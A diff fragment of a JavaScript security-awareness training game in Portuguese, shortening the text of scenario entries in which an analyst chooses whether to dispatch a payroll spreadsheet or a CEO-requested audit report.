-          { id: 'a1', label: '🚀 Despachar Planilha Financeira', correct: false, toastMsg: 'Planilha enviada.', logTitle: 'Vazamento de Dados Financeiros', consequence: 'Dados salariais confidenciais vazados para terceiros não autorizados.', explanation: 'Falso! Arquivos de folha de pagamento não são autorizados para despacho no TechVault.' },
-          { id: 'a2', label: '🚫 Rejeitar Despacho de Planilha', correct: true, toastMsg: 'Envio negado.', logTitle: 'Proteção de Dados Financeiros Mantida', consequence: 'Informações de folha de pagamento protegidas.', explanation: 'Excelente! Solicitação não autorizada pelo protocolo do manual do Word.' }
+          { id: 'a1', label: '🚀 Despachar Planilha', correct: false, toastMsg: 'Planilha enviada.', logTitle: 'Vazamento Financeiro', consequence: 'Dados salariais confidenciais vazados.', explanation: 'Folha de pagamento não é autorizada no TechVault.' },
+          { id: 'a2', label: '🚫 Rejeitar Despacho', correct: true, toastMsg: 'Envio negado.', logTitle: 'Dados Protegidos', consequence: 'Informações financeiras protegidas.', explanation: 'Excelente! Solicitação não autorizada pelo manual.' }
         ]
       },
       {
@@ -1051,20 +975,21 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
-        subject: '[FINAL DE EXPEDIENTE] Envio do Relatório Final: ciso_master_report.sig',
-        snippet: 'Encaminhe o pacote final de auditoria para o cofre seguro da Diretoria Executiva...',
+        subject: '[FINAL] Enviar ciso_master_report.sig para a Diretoria',
+        snippet: 'Encaminhe o pacote final para board-vault@techcore-vault.internal.',
         attachmentFileName: 'ciso_master_report.sig',
-        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'ciso_master_report.sig', 'Destino': 'board-vault@techcore-vault.internal', 'Data': '17:42', 'Prioridade': 'CONCLUSAO DE OPERAÇÃO' },
-        body: `<p>Última Ação do Turno 4:</p><div class="email-quote-box"><p>"Analista, despache o relatório <code>ciso_master_report.sig</code> para <code>board-vault@techcore-vault.internal</code> para finalizarmos a auditoria oficial e apresentarmos ao Conselho de Administração!"</p></div>`,
+        meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'ciso_master_report.sig', 'Destino': 'board-vault@techcore-vault.internal', 'Data': '17:42' },
+        body: `<p>Última Ação do Turno 4:</p><div class="email-quote-box"><p>Despache <code>ciso_master_report.sig</code> para <code>board-vault@techcore-vault.internal</code>.</p></div>`,
         inspector: { type: 'url', label: 'Inspeção de Despacho Final', dest: 'Arquivo: ciso_master_report.sig -> Destino: board-vault@techcore-vault.internal' },
         actions: [
-          { id: 'a1', label: '🚀 Despachar ciso_master_report.sig para a Diretoria', correct: true, toastMsg: 'Relatório final entregue à Diretoria.', logTitle: 'Auditoria Concluída com Sucesso', consequence: 'Relatório master entregue ao conselho e campanha finalizada com louvor!', explanation: 'Perfeita conclusão da campanha dos 4 turnos da TechCore.' },
-          { id: 'a2', label: '🚫 Rejeitar Despacho', correct: false, toastMsg: 'Despacho rejeitado.', logTitle: 'Atraso na Entrega da Auditoria', consequence: 'A reunião do conselho de administração não recebeu o relatório final.', explanation: 'O relatório final oficial foi solicitado expressamente pelo CEO e atende a todos os critérios do Word.' }
+          { id: 'a1', label: '🚀 Despachar ciso_master_report.sig', correct: true, toastMsg: 'Relatório entregue à Diretoria.', logTitle: 'Auditoria Concluída', consequence: 'Relatório entregue à Diretoria e campanha concluída com louvor!', explanation: 'Conclusão perfeita da campanha dos 4 turnos!' },
+          { id: 'a2', label: '🚫 Rejeitar Despacho', correct: false, toastMsg: 'Despacho rejeitado.', logTitle: 'Atraso na Entrega', consequence: 'Reunião do conselho ficou sem o relatório final.', explanation: 'O relatório oficial foi solicitado legitimamente para a Diretoria.' }
         ]
       }
     ]
   }
 ];
+
 
 // ==========================================
 // MAIN SIMULATOR CONTROLLER
